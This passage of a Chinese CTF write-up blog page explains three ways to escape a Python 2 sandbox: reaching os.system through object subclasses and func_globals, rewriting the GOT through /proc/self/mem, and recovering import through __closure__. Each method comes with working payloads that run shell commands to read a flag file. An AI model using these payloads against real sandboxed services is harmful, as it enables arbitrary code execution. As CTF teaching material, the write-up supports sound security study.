+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+<p>第一个地址是system的偏移，第二个是fopen的偏移，我们可以通过<strong>objdump</strong>获取相关信息</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/python-sanxbox-02.jpg"></p>
+<h2 id="关于这次的题目"><a href="#关于这次的题目" class="headerlink" title="关于这次的题目"></a>关于这次的题目</h2><p>我们可以通过<br><code>print ().__class__.__bases__[0].__subclasses__()[40](&quot;/home/ctf/sandbox.py&quot;).read()</code><br>获取题目源码，然后进一步分析</p>
+<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>三种方法</p>
+<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;tch_warnings&#x27;</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf&#x27;</span>)</span><br><span class="line">x.__getattribute__(<span class="string">&quot;func_global&quot;</span>+<span class="string">&quot;s&quot;</span>)[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ca&#x27;</span>+<span class="string">&#x27;t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>修改got</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s /home/ctf/&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="keyword">lambda</span> r,w:r.seek(<span class="number">0x08de2b8</span>) <span class="keyword">or</span> w.seek(<span class="number">0x08de8c8</span>) <span class="keyword">or</span> w.write(r.read(<span class="number">8</span>)) <span class="keyword">or</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb&#x27;</span>))(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>间接引用<br>在不断的dir过程中，发现<strong>closure</strong> 这个object保存了参数，可以引用原生的<strong>import</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> __import__.__getattribute__(<span class="string">&#x27;__clo&#x27;</span>+<span class="string">&#x27;sure__&#x27;</span>)[<span class="number">0</span>].cell_contents(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__getattribute__(<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>)(<span class="string">&#x27;l&#x27;</span>+<span class="string">&#x27;s home&#x27;</span>) </span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/52#toc-10">https://xz.aliyun.com/t/52#toc-10</a><br><a href="https://blog.csdn.net/qq_35078631/article/details/78504415">https://blog.csdn.net/qq_35078631/article/details/78504415</a><br><a href="https://www.anquanke.com/post/id/85571">https://www.anquanke.com/post/id/85571</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%B7%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">起因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%B2%99%E7%9B%92%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">绕过沙盒方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eimport"><span class="toc-number">1.1.1.</span> <span class="toc-text">关于import</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-%E7%BB%95%E8%BF%87%EF%BC%8C%E9%80%9A%E8%BF%87%E8%B7%AF%E5%BE%84%E5%BC%95%E5%85%A5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">0x01 绕过，通过路径引入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-dir-%E4%B8%8Edict"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">0x02 dir 与dict</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%BC%95%E7%94%A8"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">创建对象，以及引用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">其他危险的函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#getattr-%E5%92%8C-getattribute"><span class="toc-number">1.1.1.5.</span> <span class="toc-text">getattr() 和 getattribute()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E7%9A%84%E5%BC%95%E7%94%A8%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">间接的引用调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#write%E4%BF%AE%E6%94%B9got%E8%A1%A8"><span class="toc-number">1.1.3.</span> <span class="toc-text">write修改got表</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E8%BF%99%E6%AC%A1%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">关于这次的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3"><span class="toc-number">2.1.</span> <span class="toc-text">解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01"><span class="toc-number">2.1.1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02"><span class="toc-number">2.1.2.</span> <span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03"><span class="toc-number">2.1.3.</span> <span class="toc-text">0x03</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/awesome-python-sandbox-in-ciscn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&text=Python 沙盒绕过"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&is_video=false&description=Python 沙盒绕过"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Python 沙盒绕过&body=Check out this article: https://bestwing.me/awesome-python-sandbox-in-ciscn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&title=Python 沙盒绕过"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&name=Python 沙盒绕过&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/awesome-python-sandbox-in-ciscn.html&t=Python 沙盒绕过"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
